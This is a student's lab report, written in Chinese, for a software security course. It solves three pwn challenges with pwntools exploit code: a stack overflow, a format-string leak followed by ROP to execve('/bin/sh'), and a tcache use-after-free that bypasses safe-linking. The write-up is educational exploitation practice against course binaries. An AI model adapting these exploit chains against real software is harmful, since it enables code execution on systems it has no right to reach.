---
counter: True
comment: True
---

# Fanal Lab: 期末测验

!!! abstract
    软件安全 final lab 实验报告（2023.06.12 ~ 2023.07.03）

    !!! warning "仅供学习参考，请勿抄袭"

## 实验内容
- 01 - overflow
    - 成功覆盖返回地址（10分）
    - 成功跳转到后门（10分）
    - 成功完成本地的弹 shell（10分）
    - 成功完成远程弹 shell，执行 flag.exe 程序（20分）
- 02 - rop + fsb
    - 通过 fsb 泄露 libc 的基地址，拿到 system 函数地址（10分）
    - 通过 fsb 尝试改写 printf 的 GOT，通过调试分析更改的成功与失败（10分）
    - 通过 fsb 泄露栈地址（10分）
    - 通过 fsb 写 ROP payload，实现本地弹 shell（10分）
    - 成功完成远程弹 shell，按预期执行 flag.exe 程序（10分）
- 03 - bonus
    - 通过逆向发现题目漏洞，并通过脚本成功让程序 crash（10分）
    - 成功利用堆漏洞实现本地弹 shell（10分）
    - 成功完成远程弹 shell，按预期执行 flag.exe 程序（10分）

## overflow

checksec 没开启 PIE 和 canary。程序中 gets(buf) 存在栈溢出，直接溢出覆盖返回地址即可。通过 objdump 得知 buf 起始地址在 rbp-0x40：

```text
000000000040084f <main>:
  ...
  400853:       48 83 ec 50             sub    rsp,0x50
  ...
  4008b7:       48 8d 45 c0             lea    rax,[rbp-0x40]
  4008bb:       48 89 c7                mov    rdi,rax
  4008be:       b8 00 00 00 00          mov    eax,0x0
  4008c3:       e8 c8 fd ff ff          call   400690 <gets@plt>
  ...
```

所以覆盖时在返回地址前加 0x40+8 个字符 padding 即可。

接下来考虑返回的位置，直接跳到后门的话需要知道 key，但这里没必要，直接跳到 backdoor 中执行 system 的位置即可，objdump 可以得知应该跳转到 0x4007d1：

```text
00000000004007a2 <backdoor>:
  4007a2:       55                      push   rbp
  ...
  4007cc:       e8 5f fe ff ff          call   400630 <puts@plt>
  4007d1:       bf 85 09 40 00          mov    edi,0x400985
  4007d6:       e8 65 fe ff ff          call   400640 <system@plt>
  ...
```

所以主要的 exp 只有一句：

```python
p.sendlineafter(b"data:", b"A" * (64 + 8) + p64(0x4007d1))
```

![](/assets/images/sec/software/final/overflow.png)

## rop + fsb

checksec，保护全开。程序中存在 fsb 漏洞，主要过程就是将输入拼接在 "[+]: " 后面然后直接 printf，当输入的开头四个字节转为 int 为 0xdeadbeef 时退出。

### 劫持 GOT
先考虑劫持 GOT 表，RELRO 保护是 Full 的，所以理论上不能改写 GOT 表，这里仅按实验指导进行尝试。因为程序开启了 PIE，所以 GOT 表地址也是随机的，这个可以根据栈上的偏移来计算，所以只要泄漏栈地址即可。

在调试过程中发现栈布局类似如下：
```text
00:0000│ rsp 0x7ffd2500bce0 ◂— fmtstr
01:0008│     ...
02:0010│
...    │
11:0088│     0x7ffd2500bd68 ◂— 0xb7ead3bc9042ca00
12:0090│     0x7ffd2500bd70 —▸ 0x7ffd2500bd90 ◂— 0x1
13:0098│     0x7ffd2500bd78 —▸ 0x55e92680094b (main+35) ◂— mov    eax, 0
```

可以通过 fsb 任意读读取栈上那个 main+35 地址。通过尝试得知使用 %25$p 即可泄漏此处内容，即 main+35。然后可以计算得到 printf GOT 表的实际地址 main+35 - 0x94b（main+35 在代码段中偏移）+ 0x6f0（printf 的 PLT rip）+ 6（jmp 指令长度）+ 0x2008c2（GOT 偏移）。

```python
payload = b"%25$p"
p.sendline(payload)
p.recvuntil(b"[+]: ")
main_35 = int(p.recvline().strip(), 16)
success(f"main+35: {hex(main_35)}")
printf_got = main_35 - 0x94b + 0x6f0 + 6 + 0x2008c2
success(f"printf_got: {hex(printf_got)}")
```

然后再使用任意读读取 printf GOT 表内容，得到 printf 地址，从而计算 libc 基地址，以及 system 地址：

```python
payload = b"%8$sAAAAAAA" + p64(printf_got) + b"\x00"
p.sendline(payload)
p.recvuntil(b"[+]: ")
printf_addr = u64(p.recvn(6) + b"\x00\x00")
libc_base = printf_addr - libc.sym["printf"]
system_addr = libc_base + libc.sym["system"]
success(f"printf_addr: {hex(printf_addr)}")
success(f"libc_base: {hex(libc_base)}")
success(f"system_addr: {hex(system_addr)}")
```

接下来向 printf 的 GOT 表写入 system 地址，这里使用 fmtstr_payload 构造，需要将实际 payload 前内容补齐到 8 字节，然后传参 numbwritten=8（不然偏移会有错+地址无法对齐）：

```python
payload = fmtstr_payload(offset, {printf_got: system_addr}, numbwritten=8, write_size="short")
payload = b"AAA" + payload
info(f"payload: {payload}, len = {len(payload)}")
p.sendline(payload)
```

执行后会发现段错误，因为开启了 Full RELRO，不能修改 GOT 表。

### ROP
因为可以任意地址写，可以操控 func 函数退出，所以直接任意写覆盖返回地址进行 ROP 即可。

首先需要泄漏栈地址，同样任意读栈上的 rbp 即可：

```python
payload = b"%24$p"
p.sendline(payload)
p.recvuntil(b"[+]: ")
stack = int(p.recvline().strip(), 16)
ret_addr = stack - 0x200 + 0x1e8
fmtstr_addr = stack - 0xb0
success(f"ret_addr: {hex(ret_addr)}")
success(f"fmtstr_addr: {hex(fmtstr_addr)}")
```

#### ROP call system
最后一次 fsb 时在栈上布局一个 /bin/sh，这个地址也是可以知道的，然后利用一个 pop rdi ; ret 的 gadget 将其地址写入 rdi，接下来调用 system 即可，但也要注意栈对其需要加一个 ret。

这里写一个工具函数来实现任意地址八字节的写，其中 payload 一定 64 字节，加上 "[+]: AAA" 是对齐的，后面可以直接加 addition 内容比如 /bin/sh，这时内容相对于字符串开头的偏移就是 72，后续 fmtstr_addr 就可以获得 addition 地址：

```python
def fsb_write(addr, value, addition = b""):
    payload = fmtstr_payload(offset, {addr: value}, numbwritten=8, write_size="short")
    payload = b"AAA" + payload + addition
    p.sendline(payload)
    p.recvuntil(b"input: \n")
```

然后 ROPgadget 寻找 gadget 并构造 payload，这里我找的是 pwn 内部的 gadget，同样需要加上 main+35 - 0x94b 的代码段基地址偏移：

```python
"""
pwn:
0x00000000000009c3 : pop rdi ; ret
0x00000000000006b6 : ret
"""
pop_rdi_ret = main_35 - 0x94b + 0x9c3
ret = main_35 - 0x94b + 0x6b6
binsh_addr = fmtstr_addr + 72
fsb_write(ret_addr, p64(pop_rdi_ret))
fsb_write(ret_addr + 8, p64(binsh_addr))
fsb_write(ret_addr + 16, p64(ret))
fsb_write(ret_addr + 24, p64(system_addr), b"/bin/sh\x00")
```

然后写入一个 0xdeadbeef 退出 func 函数，进行 ROP：

```python
payload = p32(0xdeadbeef)
p.sendline(payload)
p.recv()
```

但是在执行过程中这里什么都没发生就结束了。经过调试，是可以正确执行到 system 里的，问题原因是这里 /bin/sh 在栈上，system 内部执行到 execve 的时候栈上那片空间可能已经被破坏。

所以可以使用 libc 内的 /bin/sh，通过 ROPgadget 可以找到：

```python
"""
pwn:
0x00000000000009c3 : pop rdi ; ret
0x00000000000006b6 : ret

remote libc:
0x00000000001b3d88 : /bin/sh

local libc:
0x00000000001d8698 : /bin/sh
"""
pop_rdi_ret = main_35 - 0x94b + 0x9c3
ret = main_35 - 0x94b + 0x6b6
binsh_libc = libc_base + (0x1b3d88 if libc_path else 0x1d8698)
fsb_write(ret_addr, p64(pop_rdi_ret))
fsb_write(ret_addr + 8, p64(binsh_libc))
fsb_write(ret_addr + 16, p64(ret))
fsb_write(ret_addr + 24, p64(system_addr))
```

![](/assets/images/sec/software/final/fsb_rop.png)

#### ROP call syscall
或者更稳定的方法是直接调用 libc 中的 syscall，这样即使 /bin/sh 在栈上也无所谓，因为 syscall 立即执行不会影响到栈上内容。

execve 的调用号为 59，作为第一个参数 rdi，第二个参数 rsi 为 /bin/sh 地址，第三四个参数 argv envp 置 0，找一些 gadget 然后构造 payload 即可：

```python
"""
pwn:
0x00000000000009c3 : pop rdi ; ret
0x00000000000006b6 : ret

remote libc:
0x0000000000023a6a : pop rsi ; ret
0x000000000011c35c : pop rdx ; pop rbx ; ret
0x00000000000e433e : pop rcx ; ret

local libc:
0x000000000002be51 : pop rsi ; ret
0x0000000000090529 : pop rdx ; pop rbx ; ret
0x000000000008c6bb : pop rcx ; ret
"""
pop_rdi_ret = main_35 - 0x94b + 0x9c3
pop_rsi_ret = libc_base + (0x23a6a if libc_path else 0x2be51)
pop_rdx_rbx_ret = libc_base + (0x11c35c if libc_path else 0x90529)
pop_rcx_ret = libc_base + (0xe433e if libc_path else 0x8c6bb)
info(f"pop rdi ; ret : {hex(pop_rdi_ret)}")

binsh_addr = fmtstr_addr + 72
syscall_addr = libc_base + libc.sym["syscall"]
info(f"syscall_addr: {hex(syscall_addr)}")

fsb_write(ret_addr     , p64(pop_rdi_ret))
fsb_write(ret_addr +  8, p64(59))
fsb_write(ret_addr + 16, p64(pop_rsi_ret))
fsb_write(ret_addr + 24, p64(binsh_addr))
fsb_write(ret_addr + 32, p64(pop_rdx_rbx_ret))
fsb_write(ret_addr + 40, p64(0))
fsb_write(ret_addr + 48, p64(0))
fsb_write(ret_addr + 56, p64(pop_rcx_ret))
fsb_write(ret_addr + 64, p64(0))
fsb_write(ret_addr + 72, p64(syscall_addr), b"/bin/sh\x00")
```

同样可以成功 getshell。

## bonus
### 逆向 & 漏洞分析
使用 IDA 进行逆向，main 函数逻辑大致：

```c 
while (1) {
    printf("Choice> ");
    switch (read_num()) {
        case 0LL: create(); break;
        case 1LL: update(); break;
        case 2LL: show(); break;
        case 3LL: delete(); break;
        case 4LL: return 0LL;
        default: continue;
    }
}
```

接下来 create 函数中读取一个 index，进行检查，需要满足几个要求：

- index <= 0xF
- *(&malloc_base + 2\*index) 为 0（没有记录过）
- size_record[2 * index] 为 0（没有记录过）

满足的情况下读一个 size 要求 <= 0x400，之后 malloc(size) 并将返回地址记录到 &malloc_base + 2*index 处，记录 size_record[2 * index] 为 size。

其他函数就更简单了，update 使用 read(0, ..., size_record[2\*index]) 读取 stdin 到指定堆块中。show 通过 write(1, ..., size_record[2*index]) 将堆块全部内容输出。delete 通过 free 释放堆块。

可以编写工具函数来方便的触发这几种操作：

```python
def create(idx, size):
    info(f"create {idx} {size}")
    p.sendlineafter(b"Choice> ", b"0")
    p.sendlineafter(b"index> ", str(idx).encode())
    p.sendlineafter(b"size> ", str(size).encode())

def update(idx, content):
    info(f"update {idx} {content}")
    p.sendlineafter(b"Choice> ", b"1")
    p.sendlineafter(b"index> ", str(idx).encode())
    p.sendafter(b"content> ", content)

def show(idx):
    info(f"show {idx}")
    p.sendlineafter(b"Choice> ", b"2")
    p.sendlineafter(b"index> ", str(idx).encode())
    p.recvuntil(b"content> ")
    # return p.recvline()

def delete(idx):
    info(f"delete {idx}")
    p.sendlineafter(b"Choice> ", b"3")
    p.sendlineafter(b"index> ", str(idx).encode())

def quit():
    p.sendlineafter(b"Choice> ", b"4")
```

这里的问题就在于 delete 的时候并没有在 malloc_base 和 size_record 中也抹除掉记录，导致存在 UAF，可以利用堆 bins 的特性泄漏 libc 地址，进行任意地址读写等。

### 漏洞利用
#### 劫持 __free_hook
这道题目和今年国赛初赛的一个堆 pwn 很像，都是 UAF + tcache 的利用，操作也差不多，但是那个题目开了 Full RELRO，这个题目只有 Partial，所以推测应该也适用，就尝试仿照那个了。

首先是利用 small bins 中区块的 fd 泄漏出 libc 基地址。需要先 free 七个 chunk 填满 tcache，接下来一个就到了 small bins 中，此时 show 即可输出 fd，然后通过调试 vmmap 计算偏移，得到 libc 基地址：

```python
for i in range(0, 8):
    create(i, 0x80)

for i in range(7, -1, -1):
    delete(i)

show(0)
libc.address = u64(p.recvn(8)) - 0x219ce0
success(f"libc: {hex(libc.address)}")
info(f"__free_hook addr: {hex(libc.sym['__free_hook'])}")
```

接下来布局 tcache 实现任意地址分配堆块。创建两个新 chunk（大小要和之前不同，不然 tcache 被前面的占满了），然后 free 掉构成 tcache->A->B。这时 UAF 覆盖 A 的 fd，然后 create 把 A 分出去，接下来再 create 就会将一个 chunk 分配到我们覆盖的 fd 位置处。

这里就是要覆盖 __free_hook：

```python
create(8, 0xf0)
create(9, 0xf0)
delete(9)
delete(8)
update(8, p64(libc.sym['__free_hook']))
create(10, 0xf0)
create(11, 0xf0)
```

这里出现了第一个问题，create(11, 0xf0) 的时候会报错 unaligned tcache chunk，调试发现 __free_hook 没有 0x10 对齐，这是 glibc 2.32 新的机制，要求对齐。所以往前移动八字到 __malloc_hook 的位置，然后稍后覆盖时给 __malloc_hook 继续覆盖 0 即可。

紧接着出现了第二个问题，在调试过程中，这个分配到的地址并不是我们写的 fd，而且堆内容是我们写的 fd，但 bins 给的地址不一样。通过搜索得知这也是 glibc 2.32 的一个新机制 safe-linking，tcache 中 fd 地址会异或（堆地址>>12）。绕过方式也很简单，读取最开头的 chunk 的 fd 即可，这里是 0 异或（堆地址>>12），所以可以直接泄漏出来：

```python
create(8, 0xf0)
create(9, 0xf0)
delete(9)
delete(8)

# leak heap addr
show(9)
heap_xor_base = u64(p.recvn(8))
success(f"heap_xor_base: {hex(heap_xor_base)}")
update(8, p64((libc.sym['__free_hook'] - 0x8) ^ heap_xor_base))
create(10, 0xf0)
create(11, 0xf0)
```

这样就可以正确分配堆块到我们指定的地址上了。接下来要向 __free_hook 写入地址，这里遇到了第三个问题，即使写入 AAAAAAAA，也不会触发段错误，疑似根本没有执行 __free_hook。搜索发现这也是 glibc 2.32 的补丁，一系列 hook 被删掉了，存在符号但实际上并不会使用。

至此劫持 __free_hook 的方法不可用了。

#### 劫持 GOT 表
劫持 GOT 表需要先找到它的地址，和上一个题一样，需要泄漏代码段基地址。问了助教学到了可以通过 _rtld_global->_dl_rtld_map->l_name 泄漏出来，但是泄漏就要进行好几次读，劫持了 GOT 后，比如将 free 改为 system，还要构造 /bin/sh，比较复杂，感觉可能 16 次操作并不够用，所以放弃了这种方法。

#### 栈上 ROP
栈上 ROP 就不需要泄漏代码段基地址了，直接泄漏栈地址就可以了。前面已经泄漏了 libc 地址。libc 中有 environ 变量，其值是栈上 main 函数的 envp 地址。根据调试就可以找到相对于 func 返回地址的偏移。

然后和上一题一样构造 syscall 的 ROP 即可。这里任意地址读和写都是利用了任意地址分配堆块然后 show/update 实现的。

尝试劫持 __free_hook 中泄漏堆地址之前的 exp 都可以重复使用，后面的 exp：

```python
# read environ
update(8, p64(libc.sym['environ'] ^ heap_xor_base))
create(10, 0xf0)
create(11, 0xf0)
show(11)
stack_addr = u64(p.recvn(8))
success(f"stack_addr: {hex(stack_addr)}")
ret_addr = stack_addr - 0x120
info(f"return addr: {hex(ret_addr)}")

# rop on stack
create(12, 0xf0)
create(13, 0xf0)
delete(13)
delete(12)
update(12, p64((ret_addr - 0x8) ^ heap_xor_base))
create(14, 0xf0)
create(15, 0xf0)

"""
libc: 
0x000000000002a3e5 : pop rdi ; ret
0x000000000002be51 : pop rsi ; ret
0x0000000000090529 : pop rdx ; pop rbx ; ret
0x000000000008c6bb : pop rcx ; ret
"""
pop_rdi_ret = libc.address + 0x2a3e5
pop_rsi_ret = libc.address + 0x2be51
pop_rdx_rbx_ret = libc.address + 0x90529
pop_rcx_ret = libc.address + 0x8c6bb
syscall_addr = libc.sym["syscall"]
info(f"syscall addr: {hex(syscall_addr)}")

payload  = b"/bin/sh\x00"
payload += flat([
    pop_rdi_ret,
    59,
    pop_rsi_ret,
    ret_addr - 0x8,
    pop_rdx_rbx_ret,
    0,
    0,
    pop_rcx_ret,
    0,
    syscall_addr
])

update(15, payload)
quit()
p.interactive()
```

刚好用完 16 个堆，远程通过：

![](/assets/images/sec/software/final/bonus.png)
